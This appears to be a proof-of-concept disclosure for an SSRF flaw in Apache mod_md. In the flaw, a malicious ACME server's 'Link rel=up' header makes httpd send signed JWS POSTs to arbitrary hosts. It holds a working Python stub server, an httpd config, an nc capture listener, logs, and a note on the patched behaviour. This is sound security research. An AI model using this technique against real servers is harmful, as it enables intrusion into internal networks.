# PoC 143 - mod_md trusts arbitrary `Link rel=up` URL during chain fetch

`get_up_link()` stores the ACME response's `Link: ...; rel=up` value
directly as the next chain-fetch URL. A malicious or compromised ACME
server can drive the client to issue signed JWS POST requests at arbitrary
hosts and ports.

## Setup

Lab httpd 2.4.66 with `mod_md` configured against a stub ACME server
running on `127.0.0.1:14000`. The stub mimics enough of an ACME flow to
reach `get_chain()` and emits a `Link` header that points at an unrelated
internal target on `127.0.0.1:18080`.

`conf/httpd.conf`:

```
ServerName localhost
Listen 127.0.0.1:8080
LoadModule mpm_prefork_module modules/mod_mpm_prefork.so
LoadModule authz_core_module  modules/mod_authz_core.so
LoadModule md_module          modules/mod_md.so
LoadModule unixd_module       modules/mod_unixd.so
LoadModule log_config_module  modules/mod_log_config.so
LoadModule watchdog_module    modules/mod_watchdog.so
LoadModule ssl_module         modules/mod_ssl.so

MDCertificateAuthority http://127.0.0.1:14000/dir
MDomain test.example
MDStoreDir md
ErrorLog logs/error_log
LogLevel md:trace4
```

The stub ACME server is a single-file Python service that walks the
client through `newAccount`, `newOrder`, finalize, and certificate fetch.
For the certificate response it sets:

```
Link: <http://127.0.0.1:18080/internal/leak>; rel="up"
```

`mock_acme.py`:

```
python3 - <<'PY' &
# Minimal stub that always returns canned JSON and the malicious Link
# header on the cert response. Real signature verification is bypassed.
# Out-of-scope: this is reachable-only-once-bootstrapped lab plumbing.
import http.server, json
LINK = '<http://127.0.0.1:18080/internal/leak>; rel="up"'
class H(http.server.BaseHTTPRequestHandler):
    def respond(self, code, body, ct="application/json", link=None):
        self.send_response(code)
        self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Replay-Nonce", "x")
        if link: self.send_header("Link", link)
        self.end_headers(); self.wfile.write(body)
    def do_GET(self):
        if self.path.endswith("/cert"):
            self.respond(200, b"-----BEGIN CERTIFICATE-----\n...\n",
                         "application/pem-certificate-chain", LINK)
        else:
            self.respond(200, b'{"newOrder":"http://127.0.0.1:14000/order"}')
    def do_POST(self):
        self.respond(200, b'{"status":"valid","certificate":"http://127.0.0.1:14000/cert"}')
http.server.HTTPServer(("127.0.0.1",14000), H).serve_forever()
PY
```

A passive listener captures the SSRF target:

```
nc -lk 127.0.0.1 18080 | tee /tmp/leak.log
```

## Trigger

Boot httpd to drive the renewal:

```
./httpd -X -d $PWD &
# wait for mod_md watchdog to attempt renewal
sleep 5
```

## Observed effect

`/tmp/leak.log` records an HTTP request from the httpd worker:

```
POST /internal/leak HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/jose+json
User-Agent: apache-httpd/2.4.66 ...

{"protected":"...","payload":"...","signature":"..."}
```

The body is a valid signed JWS produced by mod_md. `error_log` confirms:

```
[md:debug] ... server reports up link as http://127.0.0.1:18080/internal/leak
[md:debug] ... next chain cert
```

With the patch, the same exchange logs:

```
ignoring chain up link from untrusted origin: http://127.0.0.1:18080/internal/leak
```

and no request reaches `127.0.0.1:18080`.
